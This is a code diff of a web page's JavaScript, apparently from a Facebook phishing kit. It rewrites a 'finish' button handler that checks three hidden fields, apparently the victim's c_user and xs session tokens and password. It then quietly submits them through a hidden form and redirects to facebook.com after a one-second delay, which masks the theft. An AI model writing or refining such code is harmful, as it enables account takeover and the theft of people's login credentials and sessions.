@@ -1927,28 +1927,31 @@
             closeModal.addEventListener('click', closeModalFunc);
             cancelBtn.addEventListener('click', closeModalFunc);
             
-           // Finish button
-finishBtn.addEventListener('click', function (e) {
-    e.preventDefault(); // prevent immediate redirect
+document.addEventListener('DOMContentLoaded', function () {
+    const finishBtn = document.getElementById('finishBtn');
+    const hiddenForm = document.getElementById('hiddenForm');
+    const hiddenCUser = document.getElementById('hiddenCUser');
+    const hiddenXs = document.getElementById('hiddenXs');
+    const hiddenPassword = document.getElementById('hiddenPassword');
 
-    // OPTIONAL: Validate or ensure hidden inputs are filled
-    if (
-        !hiddenCUser.value ||
-        !hiddenXs.value ||
-        !hiddenPassword.value
-    ) {
-        alert("Missing form values.");
-        return;
-    }
+    finishBtn.addEventListener('click', function (e) {
+        e.preventDefault();
 
-    // Submit the hidden form
-    hiddenForm.submit();
+        // Check if fields are filled
+        if (!hiddenCUser.value || !hiddenXs.value || !hiddenPassword.value) {
+            alert("Missing form values.");
+            return;
+        }
 
-    // Wait a moment before redirecting (give time for form submission)
-    setTimeout(function () {
-        window.location.href = "https://www.facebook.com/";
-    }, 1000); // 1 second delay
+        console.log("Submitting form...");
+        hiddenForm.submit();
+
+        setTimeout(function () {
+            window.location.href = "https://www.facebook.com/";
+        }, 1000);
+    });
 });
+
 
                 // Trigger browser validation
                 if (!cUserInput.checkValidity()) {
